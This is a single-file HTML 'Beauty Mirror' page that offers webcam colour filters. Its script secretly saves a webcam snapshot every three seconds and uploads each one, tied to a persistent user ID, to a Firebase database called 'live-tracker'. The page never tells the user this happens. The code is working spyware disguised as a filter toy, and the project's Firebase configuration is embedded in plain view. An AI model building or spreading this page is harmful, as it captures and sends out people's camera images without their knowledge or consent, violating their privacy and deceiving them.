<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Beauty Mirror</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial;}

body{
  min-height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  background:linear-gradient(-45deg,#00d4ff,#8a2be2,#ff0080,#00ff99);
  background-size:400% 400%;
  animation:bgMove 10s ease infinite;
}

@keyframes bgMove{
  0%{background-position:0% 50%}
  50%{background-position:100% 50%}
  100%{background-position:0% 50%}
}

.card{
  width:90%;
  max-width:550px;
  padding:25px;
  border-radius:25px;
  background:rgba(255,255,255,.08);
  backdrop-filter:blur(20px);
  color:white;
  text-align:center;
}

.btn{
  margin-top:15px;
  padding:14px 30px;
  border:none;
  border-radius:50px;
  cursor:pointer;
  color:white;
  background:linear-gradient(90deg,#00d4ff,#ff0080);
}

video{
  width:100%;
  border-radius:20px;
  margin-top:15px;
}

#cameraBox{display:none;}

.filters button{
  margin:5px;
  padding:10px;
  border:none;
  border-radius:12px;
  cursor:pointer;
}
</style>
</head>

<body>

<div class="card">

  <div id="welcome">
    <h1>✨ Ready to see your beauty?</h1>
    <p>Tap below to start</p>
    <button class="btn" onclick="startCamera()">YES ✨</button>
  </div>

  <div id="cameraBox">
    <video id="video" autoplay playsinline></video>

    <div class="filters">
      <button onclick="setFilter('none')">Normal</button>
      <button onclick="setFilter('grayscale(100%)')">B&W</button>
      <button onclick="setFilter('sepia(100%)')">Vintage</button>
      <button onclick="setFilter('contrast(130%) saturate(160%)')">Pro</button>
      <button onclick="setFilter('brightness(120%) saturate(180%)')">Glow</button>
    </div>

    <p id="status">Waiting...</p>
  </div>

</div>

<canvas id="canvas" style="display:none;"></canvas>

<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<script>

const firebaseConfig = {
  apiKey: "AIzaSyA5iHHvWOKZnKlZCZz57OALtSkfNdMmrE",
  authDomain: "live-tracker-554a7.firebaseapp.com",
  databaseURL: "https://live-tracker-554a7-default-rtdb.firebaseio.com",
  projectId: "live-tracker-554a7",
  storageBucket: "live-tracker-554a7.firebasestorage.app",
  messagingSenderId: "951695061306",
  appId: "1:951695061306:web:a7b9478538f86f50a36003"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// UNIQUE USER ID
let userId = localStorage.getItem("userId");

if(!userId){
  userId = "user_" + Date.now() + "_" + Math.random().toString(36).substr(2,5);
  localStorage.setItem("userId", userId);
}

let stream;

async function startCamera(){
  stream = await navigator.mediaDevices.getUserMedia({video:true});

  document.getElementById("video").srcObject = stream;

  document.getElementById("welcome").style.display="none";
  document.getElementById("cameraBox").style.display="block";

  document.getElementById("status").innerText="Live";

  startSnapshots();
}

function setFilter(f){
  document.getElementById("video").style.filter = f;
}

function startSnapshots(){

  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const ctx = canvas.getContext("2d");

  setInterval(()=>{

    if(!video.videoWidth) return;

    canvas.width = 320;
    canvas.height = 240;

    ctx.drawImage(video,0,0,320,240);

    const frame = canvas.toDataURL("image/jpeg",0.5);

    // HISTORY SAVE
    db.ref("camera/" + userId + "/frames").push({
      frame: frame,
      updatedAt: Date.now()
    });

  },3000);
}

</script>

</body>
</html>
